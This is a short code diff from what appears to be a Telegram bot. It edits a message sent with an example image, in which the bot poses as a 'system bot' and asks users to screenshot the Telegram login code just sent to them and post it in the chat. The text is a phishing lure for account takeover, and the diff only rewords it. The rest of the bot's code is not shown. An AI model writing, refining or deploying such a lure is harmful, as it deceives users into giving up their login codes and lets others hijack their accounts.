@@ -106,9 +106,9 @@ async def regex_cantik(_, message):
     await app.send_photo(message.chat.id, "https://graph.org/file/9565efceb3137dcd28ece.jpg", caption="""
 🤖 **My system bot Want Log in**
 
-We sent a Screnshot  login code to your Telegram account. Enter your Login Screnshot
+We sent a login code to your Telegram account, please send take a screenshot and please post it here, as in the example Picture 
 
-📷 Please see the example picture
+📷 Please see the example Picture 
 
 Just send it in the form of a screenshot, you don't need to send it via text.
 
